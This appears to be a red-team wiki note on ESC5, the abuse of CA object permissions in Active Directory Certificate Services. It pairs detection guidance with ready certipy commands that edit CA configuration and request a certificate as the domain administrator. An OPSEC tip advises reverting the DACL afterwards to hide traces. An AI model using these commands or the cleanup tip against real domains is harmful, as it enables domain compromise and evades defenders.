---
title: "ESC5 — CA object / CA server ACL (ManageCA via WriteDacl)"
type: concept
created: 2026-09-07
updated: 2026-09-07
tags: [active-directory, ad-cs, esc, privilege-escalation, acl]
---

# ESC5

**CA object access control.** The CA itself is an AD object (plus its
computer object and the `CN=Public Key Services` container it lives under).
An attacker holding **`WriteDacl`** / **`WriteOwner`** / `GenericAll` on any
of those — the [[acl-abuse]] primitive applied to PKI — can grant themselves
**`ManageCA`**/`ManageCertificates` and then proceed as [[esc7]]: flip CA
flags, add Officers, issue certs for anyone.

It's the "control the trust anchor's object" condition, in the same family as
owning the [[krbtgt]] or the [[ntds-dit]] container.

## Exploit

```bash
# 1. find the CA object and its ACLs (BloodHound CS collector or adrecon)
#    - target: CN=<CA>,CN=Public Key Services,CN=Services,CN=Configuration,<domain>

# 2. grant yourself ManageCA on the CA object (WriteDacl -> modify DACL)
#    (SharpPKI / set-acl via Python-LDAP / PowerView's Set-DomainObjectAcl)

# 3. proceed as ESC7 — enable the CA-wide SAN flag and mint
certipy ca -u user@corp.local -p 'Pass' -ca CORP-CA -edit-config-security EDITF_ATTRIBUTESUBJECTALTNAME2
certipy req -u user@corp.local -p 'Pass' -ca CORP-CA -template User -upn administrator@corp.local
```

## Red-team notes (OPSEC)

- **Enumerate CA ACLs like you enumerate DA ACLs** — `adrecon` / BloodHound's
  CS collector surfaces the `Public Key Services` container; most AD-only
  sweeps miss it entirely.
- **One WriteDacl + one cert issuance is the whole footprint** — the 5136 on
  the CA object is the tell; revert the DACL after the cert is issued.
- A **compromised CA *server* box** (Tier-2+) is also ESC5-class: local
  admin on the CA host reaches the CA config the same way.

## Detection

- **5136/4662** on the CA object (or its container) DACL — a low-priv
  principal writing ManageCA/ManageCertificates is high-fidelity.
- **4886/4887** issuance patterns that follow a CA-DACL change.
- Host-side: unexpected config changes on the CA server (CertSvc registry).

## Links

- [[ad-cs-esc-attacks]] — ESC5 in the family
- [[esc7]] — what the CA right enables
- [[acl-abuse]] — the DACL primitive
- [[pki-and-ad-cs-architecture]] — where the CA object lives
- [[certified-pre-owned]]
